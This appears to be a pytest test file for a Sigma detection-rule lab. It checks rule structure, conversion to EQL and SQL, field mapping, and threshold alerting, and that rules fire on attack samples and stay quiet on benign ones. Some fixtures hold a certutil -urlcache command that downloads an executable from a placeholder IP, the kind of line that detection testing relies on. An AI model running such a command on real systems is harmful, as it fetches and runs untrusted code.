"""Every Sigma rule is well formed, converts for both engines and behaves on the samples."""

import json
import re
import uuid

import pytest
import yaml

from detlab import samples
from detlab.convert import to_eql, to_sql
from detlab.engine import SqliteEngine, flatten, match_matrix, threshold_alerts
from detlab.fields import FIELD_MAP, LOGSOURCES, SERVICES, flat
from detlab.rules import SIGMA_DIR, load_rules

RULE_FILES = sorted(SIGMA_DIR.rglob("*.yml"))
REQUIRED = ["title", "id", "status", "description", "references", "author", "date", "tags", "logsource",
            "detection", "falsepositives", "level"]
# A threshold rule counts the hits of the rule above it in the same file.
REQUIRED_THRESHOLD = [key if key != "logsource" else "correlation" for key in REQUIRED if key != "detection"]
PREFIX = {"windows": "win_", "linux": "lnx_"}


def _documents(path):
    return list(yaml.safe_load_all(path.read_text(encoding="utf-8")))


def test_the_lab_has_rules():
    assert len(RULE_FILES) >= 30


@pytest.mark.parametrize("path", RULE_FILES, ids=lambda path: path.stem)
def test_rule_file_is_well_formed(path):
    documents = _documents(path)
    assert len(documents) in (1, 2)
    for rule in documents:
        threshold = "correlation" in rule
        required = REQUIRED_THRESHOLD if threshold else REQUIRED
        missing = [key for key in required if not rule.get(key)]
        assert not missing, f"missing: {missing}"
        assert [key for key in rule if key != "name"][:len(required)] == required, "keys are not in the usual order"
        assert uuid.UUID(rule["id"]).version == 4
        assert rule["status"] in {"test", "stable", "experimental"}
        assert rule["level"] in {"informational", "low", "medium", "high", "critical"}
        assert re.fullmatch(r"\d{4}-\d{2}-\d{2}", str(rule["date"]))
        assert rule["description"].startswith("Detects ")
        assert all(str(reference).startswith("https://") for reference in rule["references"])
    base = documents[0]
    assert "condition" in base["detection"]
    product = base["logsource"]["product"]
    assert path.parent.name == product, "the rule is in the wrong folder"
    assert path.stem.startswith(PREFIX[product]), f"file name must start with {PREFIX[product]}"
    source = base["logsource"]
    known = (product, source["category"]) in LOGSOURCES if "category" in source else \
        (product, source.get("service")) in SERVICES
    assert known, "the lab has no events for this log source"
    if len(documents) == 2:
        threshold = documents[1]["correlation"]
        assert base["level"] == "informational", "the counted rule must not alert on its own"
        assert threshold["rules"] == [base["name"]]
        assert threshold["type"] == "event_count", "the lab's two engines agree on event_count rules only"
        assert threshold["group-by"] and threshold["timespan"] and threshold["condition"]


def test_ids_and_titles_are_unique():
    loaded = [rule for path in RULE_FILES for rule in _documents(path)]
    assert len({rule["id"] for rule in loaded}) == len(loaded)
    assert len({rule["title"] for rule in loaded}) == len(loaded)


def _fields(rule):
    """Field names a rule uses, without modifiers."""
    found = set(rule.get("correlation", {}).get("group-by", []))
    for name, body in rule.get("detection", {}).items():
        if name == "condition":
            continue
        for item in body if isinstance(body, list) else [body]:
            found |= {key.split("|")[0] for key in item}
    return found


@pytest.mark.parametrize("path", RULE_FILES, ids=lambda path: path.stem)
def test_every_field_has_a_mapping(path):
    unmapped = set().union(*(_fields(rule) for rule in _documents(path))) - set(FIELD_MAP)
    assert not unmapped, f"add {sorted(unmapped)} to detlab/fields.py"


def test_every_rule_converts_for_both_engines(rules):
    for rule in rules:
        eql = to_eql(rule)
        assert eql.startswith("sequence by " if rule.is_threshold else "any where "), rule.key
        assert to_sql(rule).startswith("WITH " if rule.is_threshold else "SELECT * FROM logs WHERE "), rule.key
        # The converted query must use ECS names only: no Sigma field may survive the mapping.
        # (`message` is the one field with the same name on both sides.)
        leftovers = [field for field, target in FIELD_MAP.items() if field != target
                     and re.search(rf"(?<![\w.]){field}(?![\w.])\s*(:|like|==|!=)", eql)]
        assert not leftovers, f"{rule.key}: unmapped {leftovers}"


def test_conversion_does_not_change_the_rule(rules):
    rule = rules[0]
    assert to_eql(rule) == to_eql(rule)
    assert to_sql(rule) == to_sql(rule)


def test_every_rule_has_attack_and_benign_samples(rules, events):
    attack_events, benign_events = events
    keys = {rule.key for rule in rules}
    assert keys == {event["labels"]["lab_rule"] for event in attack_events}
    assert keys == {event["labels"]["lab_rule"] for event in benign_events} - {"background"}


def test_sample_ids_are_unique(events):
    ids = [event["event"]["id"] for group in events for event in group]
    assert len(ids) == len(set(ids))


def test_rules_fire_on_their_attack_samples_and_on_nothing_else(rules, events):
    everything = events[0] + events[1]
    problems = samples.differences(samples.expected(everything), match_matrix(rules, everything))
    assert not problems, "\n".join(problems)


def test_a_broken_rule_is_noticed(rules, events):
    """The comparison must report a rule that stops firing and one that fires too often."""
    everything = events[0] + events[1]
    actual = match_matrix(rules, everything)
    wanted = samples.expected(everything)
    victim = events[0][0]["event"]["id"]
    bystander = events[1][0]["event"]["id"]
    actual[victim] = []
    actual[bystander] = ["win_certutil_download"]
    problems = samples.differences(wanted, actual)
    assert f"missed: {wanted[victim][0]} did not fire on {victim}" in problems
    assert f"false positive: win_certutil_download fired on {bystander}" in problems
    assert len(problems) == 2


def test_threshold_rules_alert_for_their_bursts_and_for_nothing_else(rules, events):
    everything = events[0] + events[1]
    assert samples.BURSTS, "the lab has threshold rules, so it needs grouped samples"
    assert threshold_alerts(rules, everything) == samples.expected_alerts()


def test_a_threshold_rule_needs_enough_events_inside_its_window(rules, events):
    rule = next(rule for rule in rules if rule.key == "win_failed_logon_burst")
    burst = [event for event in events[0] if event["event"]["id"].startswith("win_failed_logon_burst-burst-1-")]
    assert len(burst) == 12
    assert SqliteEngine(burst).groups(rule) == [("203.0.113.50",)]
    assert SqliteEngine(burst[:9]).groups(rule) == [], "nine failures are below the threshold of ten"
    spread = []
    for number, event in enumerate(burst):
        late = json.loads(json.dumps(event))
        late["@timestamp"] = f"2026-11-10T{9 + number // 2:02d}:{(number % 2) * 31:02d}:00.000Z"
        spread.append(late)
    assert SqliteEngine(spread).groups(rule) == [], "twelve failures over six hours never share a five minute window"


def test_regular_expressions_match_the_whole_value_as_in_elasticsearch(rules):
    rule = next(rule for rule in rules if rule.key == "win_dns_query_long_encoded_label")

    def query(name):
        return {"event": {"id": name, "code": "22", "provider": "Microsoft-Windows-Sysmon"},
                "dns": {"question": {"name": name}}}

    engine = SqliteEngine([query("3b1612dd272d1371.t.example.org"), query("3B1612DD272D1371.T.EXAMPLE.ORG"),
                           query("www.3b1612dd272d1371.example.org"), query("short.example.org")])
    assert engine.matches(rule) == ["3B1612DD272D1371.T.EXAMPLE.ORG", "3b1612dd272d1371.t.example.org"]


def test_matching_ignores_case_like_sigma(rules):
    rule = next(rule for rule in rules if rule.key == "win_certutil_download")
    event = {"event": {"id": "shouting", "code": "1", "provider": "microsoft-windows-sysmon"},
             "process": {"executable": "C:\\WINDOWS\\SYSTEM32\\CERTUTIL.EXE", "pe": {"original_file_name": "x"},
                         "command_line": "CERTUTIL.EXE -URLCACHE -F HTTP://203.0.113.10/A.EXE A.EXE"}}
    assert SqliteEngine([event]).matches(rule) == ["shouting"]


def test_an_event_from_another_log_source_does_not_match(rules):
    rule = next(rule for rule in rules if rule.key == "win_certutil_download")
    event = {"event": {"id": "linux-one"}, "host": {"os": {"type": "linux"}},
             "process": {"executable": "/usr/bin/certutil.exe", "pe": {"original_file_name": "CertUtil.exe"},
                         "command_line": "certutil.exe -urlcache -f http://203.0.113.10/a.exe"}}
    assert SqliteEngine([event]).matches(rule) == []


def test_flatten_and_column_names():
    assert flatten({"process": {"parent": {"name": "cmd.exe"}}, "event": {"code": "1"}}) == {
        "process.parent.name": "cmd.exe", "event.code": "1"}
    assert flat("process.parent.name") == "process_parent_name"
    assert flat("@timestamp") == "timestamp"


def test_rule_files_load_one_rule_each():
    assert len(load_rules()) == len(RULE_FILES)
